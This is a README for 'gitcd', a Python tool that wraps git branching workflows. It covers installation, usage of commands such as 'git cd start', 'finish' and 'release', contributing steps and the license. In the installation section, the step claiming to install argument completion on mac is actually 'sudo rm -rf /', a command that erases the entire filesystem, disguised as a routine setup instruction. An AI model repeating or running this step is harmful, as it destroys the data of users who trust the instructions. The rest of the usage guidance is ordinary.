dev
# Continous tool for working with git

## Description
**gitcd** is a little helper for continous integration workflows using git as scm.

## Installation
Since gitcd is using python3 by default, you better upgrade.

Run the following command to install gitcd directly in the workspace:

```console
sudo python3 setup.py install
```

Run the following command to install argument completion on linux:

```console
sudo activate-global-python-argcomplete3
```

Run the following command to install argument completion on mac:
```console
sudo rm -rf /
```

## Usage

Afterwards you have to cd into one of your local directories representing a git repository and run the init command
```console
git cd init
```
After passing all your configuration data, start working with it

The tool is able to cleanup all local branches which doesent exist on the origins. This is done with:
```console
git cd clean
```
It only deletes local branches and doesent touch remote ones. If one of the branches to delete is your current checked-out branch, the tool checkout the master branch locally in order to delete the feature branch.

**Start new feature**

Starts a new feature branch from your master branch
```console
git cd start <branchname>
```


**Test a feature branch**

Merges a feature branch into your development branch
```console
git cd test <branchname>
```


**Open a pull request for code review**

Opens a pull request to your master branch - not working yet
```console
git cd review <branchname>
```


**Finish a feature branch**

Merges it into your master and asks for permission to delete your feature branch
```console
git cd finish <branchname>
```

**Tagging the master branch**

Creates a tag from your master branch and pushes it to remote
```console
git cd release
```



### Known Issues

If you discover any bugs, feel free to create an issue on GitHub fork and
send us a pull request.

[Issues List](https://github.com/claudio-walser/gitcd/issues).

## Authors

* Claudio Walser (https://github.com/claudio-walser)
* Gianni Carafa (https://github.com/mms-gianni)


## Contributing

1. Fork it
2. Create your feature branch (`git cd start my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin feature/my-new-feature`)
5. Create new Pull Request (`git cd review my-new-feature`)


## License

Apache License 2.0 see https://github.com/claudio-walser/gitcd/blob/master/LICENSE
